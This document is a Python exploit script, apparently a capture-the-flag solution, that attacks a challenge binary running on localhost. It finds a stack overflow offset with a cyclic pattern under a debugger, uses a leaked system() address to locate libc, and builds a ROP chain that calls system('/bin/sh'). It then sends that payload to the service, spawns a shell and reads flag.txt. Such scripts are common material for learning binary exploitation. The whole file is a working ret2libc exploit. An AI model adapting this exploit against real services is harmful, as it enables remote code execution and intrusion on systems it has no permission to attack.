#!/usr/bin/env python3

import sys
from libdebug import debugger
from pwn import *

HOST = 'localhost'
PORT = 50000

context(arch='amd64', os='linux')

def get_offset():
    d = debugger("./container/chall")
    io = d.run()

    catcher = d.catch_signal('SIGSEGV')
    d.cont()
    io.recvuntil(b'Vad heter du?')

    payload = cyclic(0x100-1)
    io.sendline(payload)

    d.wait()
    if not catcher.hit_on(d):
        log.error('Test program did not segfault. Can not find offset')
        return None

    retaddr = d.memory[d.regs.rsp, 4]
    offset = cyclic_find(retaddr)
    return offset

def exploit(offset):
    libc = ELF('./libc.so.6')
    io = remote(HOST, PORT)

    io.recvuntil('Mitt tur-tal idag är '.encode())
    addr_system = int(io.recvuntil(b'.').decode().strip()[:-1], 16)
    log.info('Addr system(): %#x', addr_system)
    libc.address = addr_system - libc.symbols['system']
    log.info('Addr libc: %#x', libc.address)

    io.recvuntil(b'Vad heter du?')
    
    rop = ROP(libc)
    addr_sh = next(libc.search(b'/bin/sh'))
    log.info('Addr /bin/sh: %#x', addr_sh)
    rop.raw(rop.search(move=8))
    rop.call(addr_system, (addr_sh,))

    payload = b'A'*offset
    payload += bytes(rop)
    
    io.sendline(payload)
    io.recvline_contains(b'Hej ')
    io.sendline(b'cat flag.txt')
    flag = io.recvline_contains(b'SSM{')
    return flag

def main():
    offset = get_offset()
    log.info('Offset: %#x', offset)
    flag = exploit(offset)
    log.info('Flag: %s', flag)
    return 0

if __name__ == '__main__':
    sys.exit(main())
